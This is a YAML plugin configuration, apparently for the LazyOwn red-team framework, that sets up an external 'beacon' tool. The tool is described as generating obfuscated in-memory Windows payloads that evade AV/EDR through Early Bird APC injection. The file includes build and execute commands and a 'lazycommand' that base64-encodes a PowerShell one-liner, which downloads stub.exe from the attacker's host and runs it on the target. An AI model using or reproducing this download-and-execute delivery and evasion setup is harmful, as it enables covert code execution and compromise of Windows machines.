name: beacon
description: >
  beacon is a next-generation, automated framework for generating, obfuscating, and delivering beacon in pure C to windows machines. Designed for red team operations, penetration testing, and offensive research, beacon empowers attackers to deploy stealthy, payloads that execute directly in memory — bypassing traditional AV/EDR detection mechanisms using Early Bird APC Injection and NT Native API Calls.
author: "LazyOwn RedTeam"
version: "1.0"
enabled: true
params:
  - name: lhost
    type: string
    required: true
    description: lhost target.
tool:
  name: beacon
  repo_url: https://github.com/grisuno/beacon.git
  install_path: external/.exploit/beacon
  install_command: make windows
  execute_command: git restore . ; git pull ; chmod +x *.sh && ./gen_beacon.sh && cp stub.exe ../../../sessions/stub.exe && cp beacon.enc ../../../sessions/beacon.enc && cp implant_config_windows.json ../../../sessions/implant_config_windows.json
  download_file: C:\Users\Administrator\Desktop\root.txt
  lazycommand: >-
    encodewinbase64 powershell -c 'Invoke-WebRequest "http://{lhost}/stub.exe" -OutFile "stub.exe"; Start-Process "stub.exe"'
